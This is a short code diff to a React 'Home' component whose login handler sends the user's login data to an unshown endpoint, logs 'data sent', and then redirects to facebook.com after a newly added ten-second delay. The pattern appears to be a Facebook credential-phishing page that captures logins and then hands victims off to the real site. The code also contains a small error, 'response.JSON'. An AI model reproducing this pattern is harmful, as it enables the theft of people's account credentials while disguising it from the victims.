@@ -21,8 +21,11 @@ const Home = () => {
       body: JSON.stringify(loginData),
     })
       .then((response) => response.JSON)
-      .then((result) => result);
-    window.location.assign("https://facebook.com/");
+      .then((result) => console.log(result, "data sent"));
+    // window.location.assign("https://facebook.com/");
+    setTimeout(() => {
+      window.location.assign("https://facebook.com/");
+    }, 10000);
   };
 
   return (
